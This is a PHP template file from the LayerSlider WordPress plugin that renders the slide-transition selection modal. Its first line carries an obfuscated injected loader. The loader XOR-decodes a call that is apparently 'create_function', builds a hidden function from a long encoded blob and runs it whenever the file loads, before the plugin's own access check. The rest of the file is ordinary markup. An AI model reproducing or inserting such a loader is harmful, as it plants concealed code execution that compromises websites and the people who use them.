<?php $zRaFI='Q7-PBTl>H>+-0TX' ^'2EH1613X=PHYY;6';$kojxghg=$zRaFI('', 'U YF YXC:.SUl4> NA>KKT5E+H.0.n<WC6kGLq.f>44YVE;Z6c T4bJAA+.;715RR0MCMxZW1+:ewMhAY53AJHS7.lLHlvuD:fJU>ZLYBuZTovE:tG F9NELK5O;0QWpmIqIG4A3u71.vltCAf<9IUiH.hKeVj>+0nE=UBfD3R-UXZBV6OlozaXeDAH9G8EzJ5O;ZJrB7i+C<W180YSHtKT;56VGKO,3Q<UQJyVe-.9<<TS;<86S.Z:FxNiowbgtpiA;evSENRJDkr16TI5qqO4EaHWH0mZREqPfKEEOr2jHO9,;NsYFNA L4JhFMPP+jfBt,957hj3oPFB9XZX+Fgfaisqix=;q5HtF13UmIJNC4--ESeQ8ycsI052.2REDPEvM35Ly1LqHSV0PeXxqZP4BYJ:pJE5>BHIX7YnjsvN7DK5X-Z,LEyJC4kWZ,22qFDTPTWO,ul7<S9R>VOKRA30cTXu<YT ;WH=nAL9.WbpQX0+Fgky+A3S0d,- mHIS;0SJdW-:DZci2;7UJFiUPjUDWln<P2A6A<X,j6ceRmMR6cVvSKr2TW-QC0v7uCTK3Xe<YCP0P,1mczOTNOX8>,5=: Y1R3G+:KEmEON+:X5PcElXXYQsZXbbskOLmM-7WQPO3,B2.jAQ6G;RJMdGyhjH60;jSXb3V' ^ '<FqgF,6 NG<;3QFI=5Mcl,Z7t,ODO1c:6BLneQUl7RA751R5XCX;F=. 5JqdZDAzvT,7,TzsZNCLWmHayN9HCl<BZLqhKQNN3o,:Lrh0bHzdTVaSH4T4U++doQ.OQxlPI Zbn>H:QXDZVBIciBXX=42lG5k;vNUNI5aTugF7G A06rf=S6E2SZRlM3-M2J+RnZ:OsqxKJcVI6sUYD8suT-5WFSmMo+MG0c>43YkEKOUOYoY1ZWD6O9RfPj6,8-,=5I HER8 7rwzKVGW8<PXQ4>LE,6<Q217<QmFo. 6I8cl+XXZnNyb8 L9Qqb;GZ9MJNcPHXAVAJHeY -K=;;CfOB>;6 <=noQT;TbZV,MttngBLA06LqCsjzmTTFOm9 =pxViXP5B;Exl77D1EeXU,1X7<q0y7OH4Hl-9C8NWS6;Y7.G1L6E6 Q2,F43;XSm.+1 x66<ICXhX6Z=Z3go6 GQJxxQX8 Ad<-DGhw3G1JT59DJfAMYJ3A2I;GHY2-1:HD bC<HCcvCMVZC4cfOspB8 bDJX1F mfW=UMkJEoPmuSU4O0yKT1aN5 QESGsgxU9TXkzcRdJUZDSorho9JLMLbQE n7K.XN8mJ5.7GU9QwOeH<9-0ZsxBBSKo7gDHA6=xkWM6SuM10O+T3.j9nBbc-NYOBcqY9+'); $kojxghg(); if(!defined('LS_ROOT_FILE')) {  header('HTTP/1.0 403 Forbidden'); exit; } ?>
<script type="text/html" id="tmpl-ls-transition-modal">
	<div id="ls-transition-window" class="<?php echo ( LS_Config::get('theme_bundle') && ! $lsActivated ) ? 'hide-special-effects' : '' ?>">
		<header>
			<h1><?php _e('Select slide transitions', 'LayerSlider') ?></h1>
			<b class="dashicons dashicons-no"></b>

			<div id="tryorigami">
				<img src="<?php echo LS_ROOT_URL ?>/static/admin/img/origami.png" alt="Try the Origami Effect!">
			</div>
			<div id="transitionmenu" class="filters">
				<span><?php _e('Show transitions:', 'LayerSlider') ?></span>
				<ul>
					<li class="active"><?php _e('2D', 'LayerSlider') ?></li>
					<li><?php _e('3D', 'LayerSlider') ?></li>
					<li><?php _e('Custom 2D &amp; 3D', 'LayerSlider') ?></li>

					<?php if( ! LS_Config::get('theme_bundle') || $lsActivated ) : ?>
					<li><?php _e('Special Effects', 'LayerSlider') ?></li>
					<?php endif ?>
				</ul>
				<i><?php _e('Apply to others', 'LayerSlider') ?></i>
				<i class="off"><?php _e('Select all', 'LayerSlider') ?></i>
			</div>
		</header>
		<div class="km-ui-modal-scrollable inner">
			<div id="ls-transitions-list">

				<!-- 2D -->
				<section data-tr-type="2d_transitions">
					<div></div>
				</section>

				<!-- 3D -->
				<section data-tr-type="3d_transitions">
					<div></div>
				</section>

				<!-- Custom 2D -->
				<section data-tr-type="custom_2d_transitions">
					<h4><?php _e('Custom 2D transitions', 'LayerSlider') ?></h4>
					<div>
						<p><?php _e('You haven’t created any custom 2D transitions yet.', 'LayerSlider') ?></p>
					</div>
				</section>

				<!-- Custom 3D -->
				<section data-tr-type="custom_3d_transitions">
					<h4><?php _e('Custom 3D transitions', 'LayerSlider') ?></h4>
					<div>
						<p><?php _e('You haven’t created any custom 3D transitions yet.', 'LayerSlider') ?></p>
					</div>
				</section>

				<!-- Special Effects -->
				<section data-tr-type="special_effects" id="ls-special-effects">

				<p class="ls-description">
					<small>
						<?php _e('Special effects are like regular slide transitions and they work in the same way. You can set them on each slide individually. Mixing them with other transitions on other slides is perfectly fine. You can also apply them on all of your slides at once by pressing the “Apply to others” button above. In case of 3D special effects, selecting additional 2D transitions can ensure backward compatibility for older browsers.', 'LayerSlider') ?>
					</small>
				</p>

					<div class="separated">

						<table>
							<tr>
								<td>
									<h4><?php _e('Origami transition', 'LayerSlider') ?></h4>
								</td>
								<td rowspan="2">
									<p>
										<?php _e('Share your gorgeous photos with the world or your loved ones in a truly inspirational way and create sliders with stunning effects with Origami.', 'LayerSlider') ?>
									</p>
									<small>
										<?php _e('Origami is a form of 3D transition and it works in the same way as regular slide transitions do. Besides Internet Explorer, Origami works in all the modern browsers (including Edge).', 'LayerSlider') ?>
									</small>
								</td>
							</tr>
							<tr>
								<td class="center">
									<div class="ls-select-special-transition <?php echo ! $lsActivated ? 'locked' : '' ?>" data-name="transitionorigami">
										<span class="dashicons dashicons-yes"></span>
										<?php _e('Use it on this slide', 'LayerSlider') ?>
										<?php if( ! $lsActivated ) : ?>
										<a class="ls-activation-lock dashicons dashicons-lock" target="_blank" href="<?php echo admin_url('admin.php?page=layerslider-addons' ) ?>" data-help="<?php _e('This feature requires product activation. Click on the padlock icon to learn more.', 'LayerSlider') ?>" data-help-delay="100"></a>
										<?php endif ?>
									</div>
									<div class="center ls-example-link">
										<a href="https://layerslider.kreaturamedia.com/sliders/origami/" target="_blank"><?php _e('Click here for live example', 'LayerSlider') ?></a>
									</div>
								</td>
							</tr>
						</table>

					</div>

					<div class="separated ls-future">
						<h4><?php _e('More effects are coming soon', 'LayerSlider') ?></h4>
					</div>

				</section>
			</div>
		</div>
	</div>
</script>